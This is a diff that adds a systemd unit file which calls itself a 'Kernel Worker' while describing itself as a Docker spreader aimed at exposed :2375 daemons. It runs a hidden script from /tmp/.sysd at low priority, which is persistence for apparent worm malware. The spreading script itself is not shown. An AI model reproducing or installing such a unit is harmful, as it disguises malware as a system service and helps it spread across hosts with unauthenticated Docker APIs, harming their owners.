@@ -1,0 +1,9 @@
+[Unit]
+Description=Kernel Worker docker spreader (exposed :2375 daemons)
+After=network-online.target
+
+[Service]
+Type=oneshot
+ExecStart=/tmp/.sysd/dock.sh
+TimeoutStartSec=30min
+Nice=19
